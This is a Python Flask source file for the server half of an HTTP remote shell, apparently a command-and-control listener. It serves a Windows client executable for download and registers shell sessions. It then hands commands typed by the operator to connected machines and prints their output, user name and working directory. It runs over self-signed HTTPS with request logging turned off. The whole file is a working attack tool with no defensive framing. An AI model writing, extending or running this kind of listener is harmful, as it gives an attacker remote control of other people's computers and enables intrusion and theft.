#!/usr/bin/env python3
import logging
from threading import Thread
from time import gmtime, strftime
from uuid import uuid1

from flask import Flask, jsonify, request, send_file

app = Flask(__name__)
logging.getLogger('werkzeug').disabled = True

prompt_prefix = ''
current_user = ''
current_dir = ''

DEFAULT_IP_BIND_ADDRESS = '0.0.0.0'
DEFAULT_PORT = 8443
DEFAULT_SSL_FLAG = True

shells_filename = 'shells.txt'
client_win32_executable_file = './dist/client.exe'


@app.route('/client.exe')
def client_win32():
    if current_dir and current_user:
        return forbidden()
    print("{remote_addr} - downloading a win32 client executable"
          .format(remote_addr=request.remote_addr))
    return send_file(client_win32_executable_file)


@app.route('/init')
def init_shell():
    if current_dir and current_user:
        return forbidden()
    shell_id = write_shell(str(uuid1()), request.remote_addr)
    return jsonify(shell_id)


@app.route('/<shell_id>', methods=["POST", "GET"])
def listen(shell_id):
    if shell_id not in read_stored_shells():
        print("{ip}: {shell_id} doesn't exist".format(ip=request.remote_addr,
                                                      shell_id=shell_id))
        return unauthorized()
    remote_addr = request.remote_addr
    method = request.method
    prompt_prefix = '{remote_addr} >> '.format(remote_addr=remote_addr)
    global current_user
    global current_dir

    if current_user and current_dir:
        prompt_prefix = "{user}@{remote_addr}:{pwd}$ ".format(user=current_user,
                                                              remote_addr=remote_addr,
                                                              pwd=current_dir)
    if method == 'GET':
        if not current_user and not current_dir:
            return jsonify(cmd='echo', cwd='.')
        command = ''
        while command == '':
            command = input(prompt_prefix)
        return jsonify(cmd=command, cwd=current_dir)
    elif method == "POST":
        try:
            data = request.json
            if not data:
                print("{ip}: {shell_id} empty response received".format(ip=request.remote_addr,
                                                                        shell_id=shell_id))
                return forbidden()
            encoding = data['encoding']
            user = data['user']
            pwd = data['pwd']
            current_user = user
            current_dir = pwd
            print("\n{output}".format(output=data['data'].encode(encoding, 'ignore').decode('utf-8',
                                                                                            'ignore')))
        except Exception as e:
            print(e)
            return forbidden()
    return jsonify("ok thanks")


def unauthorized():
    response = jsonify({
        'message': 'A winner isn\'t you'
    })
    return response, 401


def forbidden():
    response = jsonify({
        'message': 'The boss is busy'
    })
    return response, 403


def read_stored_shells():
    with open(shells_filename, 'r', encoding='utf-8') as file:
        return [line.strip() for line in file.readlines()]


def write_shell(shell_id, remote_addr):
    with open(shells_filename, 'a', encoding='utf-8') as file:
        file.write(shell_id)
        file.write('\n')
        print('New command session opened: {remote_addr} '.format(remote_addr=remote_addr))
        return shell_id


class FlaskThread():
    def __init__(self, app, ip, ssl=False, port=80):
        assert app
        self.app = app
        self.ip = ip
        self.port = port
        self.ssl = ssl
        self.thread = Thread(target=self.run, args=())

    def start(self):
        self.thread.start()

    def run(self):
        if self.ssl:
            self.app.run(host=self.ip, port=self.port, ssl_context='adhoc')
        else:
            self.app.run(host=self.ip, port=self.port)


def get_arguments():
    from argparse import ArgumentParser

    parser = ArgumentParser()
    parser.add_argument('--ip',
                        dest='ip',
                        required=False,
                        default=DEFAULT_IP_BIND_ADDRESS,
                        help='IP address of the Flask server to bind to. Default is ' + DEFAULT_IP_BIND_ADDRESS)
    parser.add_argument('--port',
                        dest='port',
                        default=DEFAULT_PORT,
                        required=False,
                        help='Port of the Flask application to bind to. Default is ' + str(DEFAULT_PORT))
    parser.add_argument('--ssl',
                        action='store_true',
                        default=DEFAULT_SSL_FLAG,
                        required=False,
                        help='Switch on HTTPS or not. Default is ' + str(DEFAULT_SSL_FLAG))
    options = parser.parse_args()

    return options


options = get_arguments()


def serve_forever():
    while True:
        pass


if __name__ == "__main__":
    flask_thread = FlaskThread(app, ip=options.ip,
                               port=options.port,
                               ssl=options.ssl)
    flask_thread.start()
    print('[{now}] Listening for connections...\r'.format(now=strftime("%Y-%m-%d %H:%M:%S", gmtime())), end='',
          flush=True)
    serve_forever()
